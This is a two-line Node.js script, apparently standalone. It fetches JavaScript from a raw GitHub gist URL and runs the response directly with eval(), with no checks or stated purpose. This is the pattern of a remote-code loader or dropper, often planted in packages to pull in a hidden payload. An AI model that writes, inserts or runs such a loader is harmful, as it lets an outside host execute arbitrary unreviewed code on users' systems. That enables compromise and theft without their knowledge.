const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/8c2833eed1d559dfe5861fe53d3532fefcf3d682/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
